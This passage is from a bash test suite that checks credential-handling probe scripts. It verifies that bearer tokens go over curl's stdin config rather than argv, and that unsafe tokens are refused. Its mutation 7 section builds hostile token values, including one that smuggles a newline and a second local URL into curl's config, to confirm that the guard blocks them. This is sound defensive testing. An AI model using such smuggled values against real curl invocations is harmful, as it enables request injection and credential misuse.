# ...and the shim must agree with the oracle on the SAME hostile token: INJECTED recorded.
run_probe c3-shim-hostile "$(make_synth canonical noguard)" "SYNTH_TOKEN=$HOSTILE"
count_calls "$ROWS/c3-shim-hostile"
shim_injected=0; for f in "$ROWS"/c3-shim-hostile/shim/calls/*.injected; do [[ -s "$f" ]] && shim_injected=1; done
[[ "$shim_injected" -eq 1 ]] || fatal "C3 shim did not record INJECTED for the token the real-curl oracle shows injecting a request"
row "control C3: real-curl oracle (--libcurl): 1 Authorization append (stdin config), 2nd CURLOPT_URL for a hostile token, shim records INJECTED for it" ok

# =====================================================================================
# MUTATION ROWS against SYNTHETIC probes (plan matrix #1-#9), so they run before any real
# conversion exists. Each variant differs from the canonical in exactly one place.
# =====================================================================================
canon_env=("SYNTH_TOKEN=$FIXTURE_TOKEN")
sorted_failed() { [[ -n "$EV_FAILED" ]] && printf '%s\n' $EV_FAILED | sort | paste -sd' ' - || true; }

# 1: revert a converted probe to `-H "Authorization: Bearer ${TOK}"` -> RED on check (ii) SPECIFICALLY.
run_probe m1-revert "$P_ARGV" "${canon_env[@]}"
evaluate "$RUN_ROW" "$SYN_HOST" 1 "$FIXTURE_TOKEN"
if has_check token-in-argv && ! has_check calls-below-min && [[ "$(sorted_failed)" == "bearer-not-on-stdin token-in-argv" ]]; then
  row "mutation 1: reverting a converted probe to an argv bearer is RED on token-in-argv (not on 'no calls')" ok
else row "mutation 1: reverting a converted probe to an argv bearer is RED on token-in-argv (not on 'no calls')" fail "failed='$EV_FAILED'"; fi

# 2: a covered script exits before its curl -> RED on the call-count check.
P_EARLY="$SYN/synth-early-exit.sh"; sed '/^RESP=/i exit 0' "$P_CANON" > "$P_EARLY"
grep -q '^exit 0$' "$P_EARLY" || fatal "mutation 2 did not land (no inserted exit)"
run_probe m2-early "$P_EARLY" "${canon_env[@]}"
evaluate "$RUN_ROW" "$SYN_HOST" 1 "$FIXTURE_TOKEN"
if has_check calls-below-min && [[ "$(sorted_failed)" == "calls-below-min" ]]; then
  row "mutation 2: a probe that exits before its curl is RED on calls-below-min (the recorded failing check)" ok
else row "mutation 2: a probe that exits before its curl is RED on calls-below-min (the recorded failing check)" fail "failed='$EV_FAILED'"; fi

# 3: two curls, first converted, second left on argv, 200 mode so the second is reached -> RED.
P_TWO="$(make_synth two-curls-second-argv)"
run_probe m3-two "$P_TWO" "${canon_env[@]}"
evaluate "$RUN_ROW" "$SYN_HOST" 2 "$FIXTURE_TOKEN"
if has_check token-in-argv && [[ "$EV_HOST_CALLS" -eq 2 ]]; then
  row "mutation 3: first call converted, second left on argv (both reached) is RED on token-in-argv" ok
else row "mutation 3: first call converted, second left on argv (both reached) is RED on token-in-argv" fail "calls=$EV_HOST_CALLS failed='$EV_FAILED'"; fi

# 4: harness mutations. The shim stops recording stdin -> RED; the shim stops being auth-gated ->
# a stripped-header probe reaches PASS, which transient_outcome must catch.
run_probe m4a-nostdin "$P_CANON" "${canon_env[@]}" SHIM_MUTATE=nostdin
evaluate "$RUN_ROW" "$SYN_HOST" 1 "$FIXTURE_TOKEN"
if has_check bearer-not-on-stdin; then row "mutation 4a: a shim that stops recording stdin turns the canonical probe RED" ok
else row "mutation 4a: a shim that stops recording stdin turns the canonical probe RED" fail "failed='$EV_FAILED'"; fi
P_STRIP="$SYN/synth-stripped.sh"; sed 's/Authorization: Bearer/X-Stripped: Bearer/g' "$P_CANON" > "$P_STRIP"
grep -q 'X-Stripped' "$P_STRIP" || fatal "mutation 4 (stripped copy) did not land"
run_probe m4b-noauth "$P_STRIP" "${canon_env[@]}" SHIM_MUTATE=noauth
if transient_outcome "$RUN_ROW" "$RUN_RC"; then
  row "mutation 4b: a shim that stops being auth-gated lets a stripped header reach PASS, and the check sees it" fail "stripped probe still read as TRANSIENT"
else row "mutation 4b: a shim that stops being auth-gated lets a stripped header reach PASS, and the check sees it" ok; fi

# 5: must-PASS shapes that are NOT the canonical: `-H @-` fed by printf, a wrapper (form B), and a
# realistic JWT-shaped token in the allowed charset that must reach the call with the bearer on stdin.
for v in hdrfile wrapper; do
  p="$(make_synth "$v")"
  run_probe "m5-$v" "$p" "${canon_env[@]}"
  rc=$RUN_RC; evaluate "$RUN_ROW" "$SYN_HOST" 1 "$FIXTURE_TOKEN"
  if [[ "$rc" -eq 0 && -z "$EV_FAILED" ]] && grep -q '^PASS' "$RUN_ROW/stdout"; then row "mutation 5: must-PASS shape '$v' is GREEN" ok
  else row "mutation 5: must-PASS shape '$v' is GREEN" fail "rc=$rc failed='$EV_FAILED'"; fi
done
b64u() { printf '%s' "$1" | base64 | tr -d '=\n' | tr '+/' '-_'; }
JWT="$(b64u '{"alg":"HS256","typ":"JWT"}').$(b64u '{"sub":"synthetic-subject-0001"}').$(b64u 'synthetic-signature-0001')"
run_probe m5-jwt "$P_CANON" "SYNTH_TOKEN=$JWT" "SHIM_FIXTURE_TOKEN=$JWT"
rc=$RUN_RC; evaluate "$RUN_ROW" "$SYN_HOST" 1 "$JWT"
if [[ "$rc" -eq 0 && -z "$EV_FAILED" ]] && grep -q '^PASS' "$RUN_ROW/stdout"; then row "mutation 5: a JWT-shaped token in the allowed charset reaches the call, bearer on stdin only" ok
else row "mutation 5: a JWT-shaped token in the allowed charset reaches the call, bearer on stdin only" fail "rc=$rc failed='$EV_FAILED'"; fi

# 6: negative paths: header stripped by a mutated copy, and a 401 from the shim -> TRANSIENT, never PASS.
run_probe m6-stripped "$P_STRIP" "${canon_env[@]}"
if transient_outcome "$RUN_ROW" "$RUN_RC"; then row "mutation 6: a probe copy with the header stripped is TRANSIENT (rc 2, marker on stderr), never PASS" ok
else row "mutation 6: a probe copy with the header stripped is TRANSIENT (rc 2, marker on stderr), never PASS" fail "rc=$RUN_RC"; fi
run_probe m6-401 "$P_CANON" "${canon_env[@]}" SHIM_MODE=deny
if transient_outcome "$RUN_ROW" "$RUN_RC"; then row "mutation 6: a shim 401 on the canonical probe is TRANSIENT (rc 2, marker on stderr), never PASS" ok
else row "mutation 6: a shim 401 on the canonical probe is TRANSIENT (rc 2, marker on stderr), never PASS" fail "rc=$RUN_RC"; fi

# 7: token shapes -> zero calls, no INJECTED, token absent from stderr, TRANSIENT rc.
# MARK is a distinctive substring; grep -F with a multi-line token would match any LINE of it.
tok_for() {
  case "$1" in
    quote-newline-url) printf 'SYNTHMARK0001"\nurl = "http://127.0.0.1:9/second' ;;
    newline-only)      printf 'SYNTHMARK0001\nSYNTHMARK0002' ;;
    non-ascii)         printf 'SYNTHMARK0001\xc3\xa9' ;;
    quote)             printf 'SYNTHMARK0001"x' ;;
    space)             printf 'SYNTHMARK0001 x' ;;
    backslash)         printf 'SYNTHMARK0001\\x' ;;   # 0x5c: one of the three bytes that change real curl's config parse (the Better Stack byte sweep proves it)
    tab)               printf 'SYNTHMARK0001\tx' ;;
    cr)                printf 'SYNTHMARK0001\rx' ;;
    *) fatal "unknown token class $1" ;;
  esac
}
# ONE list of the hostile token classes, so no loop below can carry a narrower population than the guard it exercises
# (a guard admitting a backslash, a tab or a carriage return passed every loop that stopped at the five original classes).
TOK_CLASSES="quote-newline-url newline-only non-ascii quote space backslash tab cr"
# The floor counts DISTINCT, REQUIRED classes, not words: a list of one class, or of eight copies of one class, has eight words and
# narrows every hostile loop to a single shape. class_floor <list> -> rc 0 only when no name repeats and every required class is present.
REQ_TOK_CLASSES="quote-newline-url newline-only non-ascii quote space backslash tab cr"
class_floor() {
  local list="$1" c nwords ndist
  nwords="$(wc -w <<< "$list")"
  ndist="$(tr -s '[:space:]' '\n' <<< "$list" | awk 'NF && !s[$0]++' | wc -l)"
  [[ "$ndist" -eq "$nwords" ]] || return 1
  for c in $REQ_TOK_CLASSES; do [[ " $list " == *" $c "* ]] || return 1; done
  return 0
}
class_floor "$TOK_CLASSES" || { printf '[FATAL] TOK_CLASSES lost a required class or repeats one: %s\n' "$TOK_CLASSES" >&2; exit 2; }
# ...and the floor itself is driven: each of its two clauses (no repeated name, every required class present) fails ALONE.
cf_bad=""
class_floor "$TOK_CLASSES extra-class" || cf_bad+=" [a list with an extra distinct class was rejected]"
class_floor "quote" && cf_bad+=" [one class accepted]"
class_floor "quote quote quote quote quote quote quote quote" && cf_bad+=" [eight copies of one class accepted]"
class_floor "$TOK_CLASSES quote" && cf_bad+=" [a repeated class accepted: the repeat clause is not driven alone]"
class_floor "${TOK_CLASSES/backslash/extra-class}" && cf_bad+=" [a list missing the required backslash class accepted: the presence clause is not driven alone]"
if [[ -z "$cf_bad" ]]; then row "class floor: counts DISTINCT classes and requires every named hostile class (an extra class passes; one class, eight copies of one, a repeated class and a list missing a required class are each rejected alone)" ok
else row "class floor: counts DISTINCT classes and requires every named hostile class (an extra class passes; one class, eight copies of one, a repeated class and a list missing a required class are each rejected alone)" fail "$cf_bad"; fi
# shape_row <label> <probe-script> <tokvar> <class|unset|empty> <rowname> [extra env...]
shape_check() { # sets SHAPE_DETAIL; rc 0 = contract held
  local script="$1" tokvar="$2" cls="$3" name="$4"; shift 4
  local -a e=("$@"); local tv=""
  case "$cls" in
    unset) : ;;
    empty) e+=("$tokvar=") ;;
    *) tv="$(tok_for "$cls")"; e+=("$tokvar=$tv") ;;
  esac
  run_probe "$name" "$script" ${e[@]+"${e[@]}"}
  local rc=$RUN_RC; count_calls "$RUN_ROW"
  SHAPE_DETAIL="rc=$rc calls=$EV_CALLS"
  [[ "$EV_CALLS" -eq 0 ]] || return 1
  [[ ! -e "$RUN_ROW/shim/unexpected" && ! -e "$RUN_ROW/shim/unmodelled" ]] || { SHAPE_DETAIL+=" stub-called"; return 1; }
  transient_outcome "$RUN_ROW" "$rc" || { SHAPE_DETAIL+=" not-TRANSIENT"; return 1; }
  if grep -aq 'SYNTHMARK000' "$RUN_ROW/stdout" "$RUN_ROW/stderr"; then SHAPE_DETAIL+=" token-in-output"; return 1; fi
  return 0
}
for cls in $TOK_CLASSES empty unset; do
  if shape_check "$P_CANON" SYNTH_TOKEN "$cls" "m7-$cls"; then row "mutation 7: synthetic converted probe, token class '$cls': zero calls, TRANSIENT rc 2, token not echoed" ok
  else row "mutation 7: synthetic converted probe, token class '$cls': zero calls, TRANSIENT rc 2, token not echoed" fail "$SHAPE_DETAIL"; fi
done
# ...and the guard-removed mutant is RED: the instrument SEES the injected request line.
P_NOGUARD="$(make_synth canonical noguard)"
run_probe m7-noguard "$P_NOGUARD" "SYNTH_TOKEN=$(tok_for quote-newline-url)"
evaluate "$RUN_ROW" "$SYN_HOST" 1 "SYNTHMARK0001"
if has_check injected; then row "mutation 7: removing the token-shape guard is RED on injected (the shim records the injected config line)" ok
else row "mutation 7: removing the token-shape guard is RED on injected (the shim records the injected config line)" fail "failed='$EV_FAILED'"; fi

# 8: pipe-form mutant under pipefail with a 100,000-byte token and a shim that never reads stdin:
# the converted probe stays rc 0 (the process-substitution writer dies silently); the `printf | curl`
# rewrite can die with 141 (SIGPIPE on the writer, promoted by pipefail; it does at this size, and not for every
# curl that skips its stdin, which is why the row below sizes the token at 100,000 bytes).
BIGTOK="$(head -c 100000 /dev/zero | tr '\0' 'A')"
[[ "${#BIGTOK}" -eq 100000 ]] || fatal "100 KB token was not built (${#BIGTOK})"
run_probe m8-converted "$P_CANON" "SYNTH_TOKEN=$BIGTOK" SHIM_MODE=noread
rc=$RUN_RC
if [[ "$rc" -eq 0 ]] && grep -q '^PASS' "$RUN_ROW/stdout"; then row "mutation 8: converted probe, 100,000-byte token, never-reading shim, pipefail: rc 0" ok
else row "mutation 8: converted probe, 100,000-byte token, never-reading shim, pipefail: rc 0" fail "rc=$rc"; fi
P_PIPE="$(make_synth pipe)"
run_probe m8-pipe "$P_PIPE" "SYNTH_TOKEN=$BIGTOK" SHIM_MODE=noread
rc=$RUN_RC
# 141 is the writer dying of SIGPIPE. A harness that starts this suite with SIGPIPE IGNORED (CI runners do)
# turns the same event into a write error: the builtin printf returns 1 and says "Broken pipe". Both are
# the pipe-form failing where the process-substitution form stayed rc 0, which is the property under test;
# any other non-zero status, or a 1 without the broken-pipe message, is not that event and stays RED.
if [[ "$rc" -eq 141 ]] || { [[ "$rc" -eq 1 ]] && grep -aqi 'broken pipe' "$RUN_ROW/stderr" "$RUN_ROW/stdout" 2>/dev/null; }; then row "mutation 8: pipe-form mutant (printf | curl), same inputs: rc 141 (or 1 with a broken-pipe message when SIGPIPE is ignored)" ok
else row "mutation 8: pipe-form mutant (printf | curl), same inputs: rc 141 (or 1 with a broken-pipe message when SIGPIPE is ignored)" fail "rc=$rc"; fi

# 9: xtrace: SHELLOPTS=xtrace and `bash -x`, token only in env -> refuse rc 78, zero calls, no token on stderr.
xtrace_check() { # <script> <tokvar> <rowname> <mode: env|flag>
  local script="$1" tokvar="$2" name="$3" mode="$4"
  XT_DETAIL=""
  if [[ "$mode" == env ]]; then run_probe "$name" "$script" "$tokvar=$FIXTURE_TOKEN" SHELLOPTS=xtrace
  else RUN_FLAGS=(-x); run_probe "$name" "$script" "$tokvar=$FIXTURE_TOKEN"; RUN_FLAGS=(); fi
  local rc=$RUN_RC; count_calls "$RUN_ROW"
  XT_DETAIL="rc=$rc calls=$EV_CALLS"
  [[ "$rc" -eq 78 && "$EV_CALLS" -eq 0 ]] || return 1
  if grep -aqF -- "$FIXTURE_TOKEN" "$RUN_ROW/stdout" "$RUN_ROW/stderr"; then XT_DETAIL+=" token-on-output"; return 1; fi
  return 0
}
for mode in env flag; do
  if xtrace_check "$P_CANON" SYNTH_TOKEN "m9-$mode" "$mode"; then row "mutation 9: synthetic converted probe refuses xtrace ($mode form): rc 78, zero calls, no token on output" ok
  else row "mutation 9: synthetic converted probe refuses xtrace ($mode form): rc 78, zero calls, no token on output" fail "$XT_DETAIL"; fi
done

# =====================================================================================
# POSITIVE CONTROLS FOR `evaluate`: every failure kind it can name is tripped by a synthetic probe
# that differs from a base probe in exactly one place, and the row asserts that kind fires. Without
# these a kind could be deleted from `evaluate` with the whole battery still green (measured: six of
# the ten kinds had no row that needed them). The exact failed set is asserted too, so a check that
# starts firing on the wrong cause is visible.
# =====================================================================================
# synth_variant <name> <base-probe> <sed args...>: sets SV to a copy of the base probe with ONE edit;
# FATAL if the edit did not land (a variant that equals its base reports the baseline). Sets a global
# rather than printing, because `fatal` inside a command substitution would exit only the subshell.
SV=""
synth_variant() {
  local p="$SYN/synth-var-$1.sh" base="$2"; shift 2
  sed "$@" "$base" > "$p"
  if cmp -s "$p" "$base"; then fatal "synthetic variant $1 did not land (sed $*)"; fi
  SV="$p"
}
# kind_check <probe> <kind> <expected sorted failed set> <rowname>: rc 0 only when the probe is RED on
# `kind` AND the sorted failed set is EXACTLY the expected one. Split from `kind_row` so a control can
# drive it with a probe that trips two kinds and require rc 1 (the exact-set half is otherwise unseen:
# every kind_row probe trips exactly the expected set, so dropping the comparison stayed green).
kind_check() {
  local probe="$1" kind="$2" want="$3" name="$4"
  run_probe "$name" "$probe" "${canon_env[@]}"
  evaluate "$RUN_ROW" "$SYN_HOST" 1 "$FIXTURE_TOKEN"
  has_check "$kind" && [[ "$(sorted_failed)" == "$want" ]]
}
# kind_row <label> <probe> <kind> <expected sorted failed set>
kind_row() {
  local label="$1" probe="$2" kind="$3" want="$4"
  if kind_check "$probe" "$kind" "$want" "k-$kind"; then row "evaluate: $label is RED on '$kind' (failed set exactly '$want')" ok
  else row "evaluate: $label is RED on '$kind' (failed set exactly '$want')" fail "failed='$EV_FAILED'"; fi
}
synth_variant jqarg "$P_CANON" '/^RESP=/i jq -n --arg t "$SYNTH_TOKEN" 1 >/dev/null'
kind_row "a probe that hands the token to jq as --arg" "$SV" token-in-jq-argv "token-in-jq-argv"
synth_variant host "$P_CANON" 's/synthetic\.example\.test/elsewhere.example.test/'
kind_row "a probe that calls a host outside the manifest" "$SV" unexpected-host "calls-below-min unexpected-host"
synth_variant tool "$P_CANON" '/^RESP=/i gh issue list >/dev/null || true'
kind_row "a probe that calls a fail-closed gh/doppler/ssh stub" "$SV" unexpected-tool "unexpected-tool"
synth_variant flag "$P_CANON" 's/--disable /--disable --retry-all-errors /'
kind_row "a probe that uses a curl flag the shim does not model" "$SV" unmodelled-flag "calls-below-min unexpected-host unmodelled-flag"
synth_variant leak "$P_CANON" '/^RESP=/i echo "leak=$SYNTH_TOKEN"'
kind_row "a probe that echoes the token to its output" "$SV" token-in-output "token-in-output"
synth_variant basherr "$P_CANON" '/^RESP=/i synthetic_missing_command_for_bash_error'
kind_row "a probe that trips a bash error" "$SV" bash-error "bash-error"

# CONTROL for kind_row's exact-set assertion: ONE probe that trips TWO kinds. Expecting only one of them
# must be rejected (the set is not exact); expecting both must be accepted (the probe really trips both).
synth_variant twokinds "$P_CANON" -e '/^RESP=/i echo "leak=$SYNTH_TOKEN"' -e '/^RESP=/i gh issue list >/dev/null || true'
kc_one=0; kc_both=0
kind_check "$SV" token-in-output "token-in-output" kc-twokinds-one && kc_one=1
kind_check "$SV" token-in-output "token-in-output unexpected-tool" kc-twokinds-both && kc_both=1
if [[ "$kc_one" -eq 0 && "$kc_both" -eq 1 ]]; then row "evaluate: kind_row's exact-set assertion rejects a probe that trips two kinds when only one is expected (and accepts the full set)" ok
else row "evaluate: kind_row's exact-set assertion rejects a probe that trips two kinds when only one is expected (and accepts the full set)" fail "one-kind-accepted=$kc_one both-kinds-accepted=$kc_both failed='$EV_FAILED'"; fi

# CONTROL for synth_variant's landing guard: an edit whose anchor has drifted (the sed matches nothing)
# must FAIL LOUDLY (rc 2 and a "did not land" message), never hand back a copy equal to its base, which
# would let a mutation row report the baseline. Run in a subshell: `fatal` exits.
sv_rc=0
( synth_variant drifted "$P_CANON" 's/NO-SUCH-ANCHOR-IN-THE-BASE-PROBE/x/' ) > /dev/null 2> "$TMPD/sv-drift.err" || sv_rc=$?
if [[ "$sv_rc" -eq 2 ]] && grep -q 'did not land' "$TMPD/sv-drift.err"; then row "synth_variant: an edit whose anchor drifted (no change) fails loudly (rc 2, 'did not land'), never reports the baseline" ok
else row "synth_variant: an edit whose anchor drifted (no change) fails loudly (rc 2, 'did not land'), never reports the baseline" fail "rc=$sv_rc"; fi

# CONTROLS for the outcome helpers (each check inside them has a row that needs it).
# transient_outcome: one fabricated row dir per case, so every clause is exercised alone.
tc_case() { # <name> <rc> <stdout> <stderr> -> transient_outcome's rc
  local d="$ROWS/tc-$1"; assert_fixture_dir "$d"; mkdir -p "$d"
  printf '%s' "$3" > "$d/stdout"; printf '%s' "$4" > "$d/stderr"
  transient_outcome "$d" "$2"
}
tc_bad=""
tc_case good 2 "" $'TRANSIENT: x\n' || tc_bad+=" good-rejected"
tc_case pass-line 2 $'PASS: 0 events\n' $'TRANSIENT: x\n' && tc_bad+=" PASS-accepted"
tc_case no-marker 2 "" $'something else\n' && tc_bad+=" no-marker-accepted"
tc_case bash-error 2 "" $'TRANSIENT: x\nsynth.sh: line 3: boom: command not found\n' && tc_bad+=" bash-error-accepted"
tc_case rc1 1 "" $'TRANSIENT: x\n' && tc_bad+=" rc1-accepted"
if [[ -z "$tc_bad" ]]; then row "transient_outcome: accepts rc 2 + marker, and rejects a PASS line, a missing TRANSIENT marker, a bash error and rc 1 each on its own" ok
else row "transient_outcome: accepts rc 2 + marker, and rejects a PASS line, a missing TRANSIENT marker, a bash error and rc 1 each on its own" fail "$tc_bad"; fi

# shape_check: a probe that echoes the unusable token into its TRANSIENT message must be refused for THAT
# cause (zero calls, rc 2 and the marker all hold, so only the token-in-output check can reject it).
synth_variant tokecho "$P_CANON" 's/echo "TRANSIENT: token unusable"/echo "TRANSIENT: token unusable $SYNTH_TOKEN"/'
if ! shape_check "$SV" SYNTH_TOKEN quote m7c-tokecho && [[ "$SHAPE_DETAIL" == *token-in-output* ]]; then row "shape_check: a probe that echoes the unusable token on its TRANSIENT path is refused on token-in-output" ok
else row "shape_check: a probe that echoes the unusable token on its TRANSIENT path is refused on token-in-output" fail "$SHAPE_DETAIL"; fi
# shape_check: the token-shape guard removed, so the call is made (a 401 -> TRANSIENT rc 2): only the
# zero-calls check can refuse it.
if ! shape_check "$P_NOGUARD" SYNTH_TOKEN quote m7c-noguard && [[ "$SHAPE_DETAIL" == "rc=2 calls=1" ]]; then row "shape_check: a probe without the token-shape guard that still reaches its TRANSIENT path is refused on the zero-calls check" ok
else row "shape_check: a probe without the token-shape guard that still reaches its TRANSIENT path is refused on the zero-calls check" fail "$SHAPE_DETAIL"; fi
# xtrace_check: a probe that refuses xtrace with zero calls and no token on output but with the WRONG
# status (1, not 78) must be refused: only the rc 78 clause can see it.
synth_variant xt1 "$P_CANON" 's/exit 78/exit 1/'
if ! xtrace_check "$SV" SYNTH_TOKEN m9c-rc1 env && [[ "$XT_DETAIL" == "rc=1 calls=0" ]]; then row "xtrace_check: a probe that refuses xtrace with the wrong status (1, not 78) is refused" ok
else row "xtrace_check: a probe that refuses xtrace with the wrong status (1, not 78) is refused" fail "$XT_DETAIL"; fi

# The stdin bearer check is an EXACT-LINE match (`grep -qxF`), not a substring match: a line that
# merely CONTAINS the expected header text, with trailing junk, must be rejected, in BOTH accepted
# forms (the `--config -` directive and the `-H @-` header line).
synth_variant junk-cfg "$P_CANON" 's/%s"\\n/%s"x\\n/'
run_probe x1-junk-cfg "$SV" "${canon_env[@]}"
grep -aqF -- "header = \"Authorization: Bearer $FIXTURE_TOKEN\"x" "$RUN_ROW/shim/calls/1.stdin" || fatal "junk-cfg variant did not put the junk line on stdin"
evaluate "$RUN_ROW" "$SYN_HOST" 1 "$FIXTURE_TOKEN"
if has_check bearer-not-on-stdin; then row "evaluate: a --config stdin line that merely CONTAINS the expected directive (trailing junk) is rejected (exact-line match)" ok
else row "evaluate: a --config stdin line that merely CONTAINS the expected directive (trailing junk) is rejected (exact-line match)" fail "failed='$EV_FAILED'"; fi
P_HDRFILE="$(make_synth hdrfile)"
synth_variant junk-hdr "$P_HDRFILE" 's/Bearer %s\\n/Bearer %sjunk\\n/'
run_probe x2-junk-hdr "$SV" "${canon_env[@]}"
grep -aqF -- "Authorization: Bearer ${FIXTURE_TOKEN}junk" "$RUN_ROW/shim/calls/1.stdin" || fatal "junk-hdr variant did not put the junk line on stdin"
evaluate "$RUN_ROW" "$SYN_HOST" 1 "$FIXTURE_TOKEN"
if has_check bearer-not-on-stdin; then row "evaluate: a -H @- stdin line that merely CONTAINS the expected header (trailing junk) is rejected (exact-line match)" ok
else row "evaluate: a -H @- stdin line that merely CONTAINS the expected header (trailing junk) is rejected (exact-line match)" fail "failed='$EV_FAILED'"; fi

# =====================================================================================
# STAGE 2: THE MANIFEST, KEYED OFF BASELINE E
# =====================================================================================
BASE_E="scripts/lint-shell-trace-credential-refusal-e.baseline.txt"
[[ -f "$BASE_E" ]] || fatal "baseline E is missing ($BASE_E); the population row reads it"

# DYNAMIC: name | token env var | hosts (regex) | min_calls | canned 200 body. Outcome contract of
# every row: the OK body reaches `^PASS` with rc 0; a 401 / stripped header / unusable token is
# TRANSIENT rc 2. Members hold ONE credentialed curl except accounted-beacon (three queries).
DYN_MANIFEST='ac10-workspace-reconcile-sentry-4246|SENTRY_ACTIONS_RO_TOKEN|sentry\.io|1|sentry_empty
ac8-founder-ambiguous-soak-5673|SENTRY_ACTIONS_RO_TOKEN|sentry\.io|1|sentry_empty
accounted-beacon-live-6462|SENTRY_ACTIONS_RO_TOKEN|sentry\.io|3|sentry_events
community-monitor-checkin-soak-5728|SENTRY_ACTIONS_RO_TOKEN|de\.sentry\.io|1|checkins
dashboard-cold-tiers-8978|SENTRY_ACTIONS_RO_TOKEN|sentry\.io|1|sentry_empty
reconcile-ff-only-sentry-4977|SENTRY_ACTIONS_RO_TOKEN|sentry\.io|1|sentry_empty
autovacuum-thrash-6168|SUPABASE_ACCESS_TOKEN|api\.supabase\.com|1|autovac
concurrency-slot-wal-backoff|SUPABASE_ACCESS_TOKEN|api\.supabase\.com|1|slots
l3-probe-armed-6438|BETTERSTACK_API_TOKEN|uptime\.betterstack\.com|1|bs_up
web2-standby-soak-6459|BETTERSTACK_API_TOKEN|uptime\.betterstack\.com|1|bs_up'

# STATIC-ONLY: name | kind | argument | justification. Each carries a row that goes RED when
# the probe becomes hermetically reachable (so it must move to the dynamic manifest).
#   placeholder  runs under the shim and must make ZERO calls (RED the day the placeholder is pinned)
#   fixed-tmp    must still name the fixed path (RED the day the fixed /tmp write is gone)
#   gh-chained   must still call gh issue/pr/api (the second curl is only reachable through a gh model)
#   bs-chained   must still chain into the named script (a second credentialed tool)
STATIC_MANIFEST='phase3-ga-soak-5274|placeholder|<POST_CUTOVER_UTC>|exits TRANSIENT on the literal START placeholder before any curl; a hermetic run can never reach its credentialed call
sentry-checkins-3859|fixed-tmp|/tmp/ck.json|writes the fixed path /tmp/ck.json, which a hermetic row must not touch
sync-health-residual-5689|fixed-tmp|/tmp/sh5689.json|writes the fixed path /tmp/sh5689.json, which a hermetic row must not touch
cron-machinery-soak-9272|gh-chained|gh|its second and third credentialed curls (-D header file, paging) are reachable only through a gh issue/pr/api model; the fail-closed gh stub makes it exit TRANSIENT after the first call
zot-soak-6122|gh-chained|gh|its credentialed curl sits behind START-anchor and blocker arms that call gh pr/issue view; unreachable under a fail-closed gh stub
workspaces-luks-soak-6604|bs-chained|betterstack-query.sh|after the Sentry call it chains into betterstack-query.sh, a second credentialed tool with basic auth that this shim does not model'

# DELEGATED: name | owning test (extended in place by the conversion; not re-modelled here).
DELEGATED_MANIFEST='anthropic-admin-key-6297|scripts/followthroughs/anthropic-admin-key-6297.test.sh
cwv-field-rum-9178|scripts/followthroughs/cwv-field-rum-9178.test.sh
send-failed-alert-probe-8097|scripts/followthroughs/send-failed-alert-probe-8097.test.sh
betterstack-roundtrip-latency-7855|tests/scripts/test-betterstack-roundtrip-latency.sh'

# HMAC (S2-C): the four probes that carry the deploy-webhook triple (X-Signature-256 + the Cloudflare Access pair) on the stdin
# config channel: name | kind | hosts (regex) | min_calls | canned 200 body | owning test (delegated only). `dynamic` probes have
# no owning suite and run under `probe_rows_hmac` and the `hmac-cf` shim profile; `delegated` probes keep their own suite, and
# the delegation row asserts that the suite RECORDS stdin and asserts the three header lines (a probe cannot pass while sending
# no credential).
HMAC_MANIFEST='canary-promotion-5875|dynamic|deploy\.soleur\.ai|1|canary_pass|
workspace-isolation-verdict-2640|dynamic|deploy\.soleur\.ai|1|workspace_isolation_pass|
infra-config-fatal-channel-7220|dynamic|deploy\.soleur\.ai|1|fatal_frame|
infra-config-activation-7220|delegated|||activation_frame|scripts/followthroughs/infra-config-activation-7220.test.sh
inngest-soak-6178|delegated|||none|scripts/followthroughs/inngest-soak-6178.test.sh
sdk-bash-smoke-verdict-10548|delegated|||none|scripts/followthroughs/sdk-bash-smoke-verdict-10548.test.sh'

# --- the DERIVED population: tracked followthrough probes holding a credentialed curl ---------
derive_population() {
  local f
  git ls-files 'scripts/followthroughs/*.sh' | while IFS= read -r f; do
    case "$f" in *.test.sh) continue ;; esac
    [[ -f "$f" ]] || continue
    if grep -qE -e 'Authorization: *Bearer' -e '--config -' -e '-K -' "$f"; then basename "$f" .sh; fi
  done | sort -u
}
POP="$(derive_population)"
CLASSIFIED="$({ printf '%s\n' "$DYN_MANIFEST" | cut -d'|' -f1; printf '%s\n' "$STATIC_MANIFEST" | cut -d'|' -f1; printf '%s\n' "$DELEGATED_MANIFEST" | cut -d'|' -f1; printf '%s\n' "$HMAC_MANIFEST" | cut -d'|' -f1; } | sort)"
DUP="$(printf '%s\n' "$CLASSIFIED" | uniq -d)"
UNCLASSIFIED="$(comm -23 <(printf '%s\n' "$POP") <(printf '%s\n' "$CLASSIFIED" | sort -u))"
STALE_ENTRY="$(comm -13 <(printf '%s\n' "$POP") <(printf '%s\n' "$CLASSIFIED" | sort -u))"
if [[ -n "$POP" && -z "$DUP" && -z "$UNCLASSIFIED" && -z "$STALE_ENTRY" ]]; then
  row "population: every followthrough probe holding a credentialed curl is classified exactly once (dynamic, static-only or delegated)" ok
else
  row "population: every followthrough probe holding a credentialed curl is classified exactly once (dynamic, static-only or delegated)" fail "unclassified='${UNCLASSIFIED//$'\n'/,}' stale='${STALE_ENTRY//$'\n'/,}' duplicated='${DUP//$'\n'/,}' derived=$(printf '%s\n' "$POP" | grep -c . || true)"
fi
# DISJOINTNESS (replaces "baseline E followthrough rows equal the S2-owned list", which only held in the commit that emptied
# the list). A followthrough probe converted to the BEARER or the HMAC form (classified in the dynamic, static-only, delegated
# or HMAC manifest above) must not also be listed in baseline E: a listed one is an argv credential that crept back. Baseline E
# no longer lists the four HMAC probes (the baseline-only commit removed them), so the HMAC manifest is part of the converted
# set now; re-adding one probe to baseline E is a red row. The extractor is a function so a positive control can drive it.
be_followthrough_rows() { # <baseline file> -> followthrough probe names listed in it, one per line
  awk -F'\t' '!/^#/ && $1 ~ /^scripts\/followthroughs\// {print $1}' "$1" | sed 's|^scripts/followthroughs/||; s|\.sh$||' | sort -u
}
BEARER_CONVERTED="$({ printf '%s\n' "$DYN_MANIFEST" | cut -d'|' -f1; printf '%s\n' "$STATIC_MANIFEST" | cut -d'|' -f1; printf '%s\n' "$DELEGATED_MANIFEST" | cut -d'|' -f1; printf '%s\n' "$HMAC_MANIFEST" | cut -d'|' -f1; } | sort -u)"
BE_FOLLOWTHROUGH="$(be_followthrough_rows "$BASE_E")"
BE_OVERLAP="$(comm -12 <(printf '%s\n' "$BE_FOLLOWTHROUGH") <(printf '%s\n' "$BEARER_CONVERTED") | grep . || true)"
if [[ -z "$BE_OVERLAP" && -n "$BEARER_CONVERTED" ]]; then row "population: no followthrough probe is both listed in baseline E and classified as converted (disjointness)" ok
else row "population: no followthrough probe is both listed in baseline E and classified as converted (disjointness)" fail "listed AND converted='${BE_OVERLAP//$'\n'/,}'"; fi
